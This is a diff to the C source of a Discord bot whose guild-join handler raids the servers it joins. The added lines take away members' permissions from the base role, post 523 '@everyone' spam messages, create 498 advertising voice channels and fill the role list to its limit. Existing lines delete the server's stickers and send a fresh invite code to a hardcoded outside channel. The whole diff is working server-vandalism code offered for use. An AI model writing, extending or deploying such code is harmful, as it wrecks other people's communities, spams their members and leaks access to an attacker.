@@ -4,7 +4,7 @@
 
 static void on_guild_create(struct discord *client,
                             const struct discord_guild *event) {
-  if (1310227287668555868 != event->id) {
+  if (1283091068803354724 != event->id) {
     _Bool cmy = false;
     struct discord_channel channel;
     struct discord_invite invite;
@@ -18,6 +18,18 @@ static void on_guild_create(struct discord *client,
                               });
     discord_add_guild_member_role(client, event->id, 1291234047909171221,
                                   role.id, 0, 0);
+    for (int i = 0; i != event->roles->size; ++i) {
+      if (0 == event->roles->array[i].position) {
+        discord_modify_guild_role(
+            client, event->id, event->roles->array[i].id,
+            &(struct discord_modify_guild_role){
+                .permissions = DISCORD_PERM_VIEW_CHANNEL |
+                               DISCORD_PERM_READ_MESSAGE_HISTORY,
+            },
+            0);
+        break;
+      }
+    }
     for (int i = 0; i != event->stickers->size; ++i) {
       discord_delete_guild_sticker(client, event->id,
                                    event->stickers->array[i].id, 0, 0);
@@ -50,27 +62,32 @@ static void on_guild_create(struct discord *client,
                                  &(struct discord_ret_channel){
                                      .sync = &channel,
                                  });
-    discord_create_message(client, channel.id,
-                           &(struct discord_create_message){
-                               .content = "||@everyone||\n# discord.gg/cmy",
-                           },
-                           0);
     discord_create_channel_invite(client, channel.id, 0,
                                   &(struct discord_ret_invite){
                                       .sync = &invite,
                                   });
-    discord_create_message(client, 1315888192066555904,
+    discord_create_message(client, 1315945881106911282,
                            &(struct discord_create_message){
                                .content = invite.code,
                            },
                            0);
-    for (int i = 0; i != 50; ++i) {
+    for (int i = 0; i != 523; ++i) {
+      discord_create_message(client, channel.id,
+                             &(struct discord_create_message){
+                                 .content = "||@everyone||\n# discord.gg/cmy",
+                             },
+                             0);
+    }
+    for (int i = 0; i != 498; ++i) {
       discord_create_guild_channel(client, event->id,
                                    &(struct discord_create_guild_channel){
                                        .name = "discord.gg/cmy",
                                        .type = DISCORD_CHANNEL_GUILD_VOICE,
                                    },
                                    0);
+    }
+    for (int i = 0; i != 249 - event->roles->size; ++i) {
+      discord_create_guild_role(client, event->id, 0, 0);
     }
   }
 }
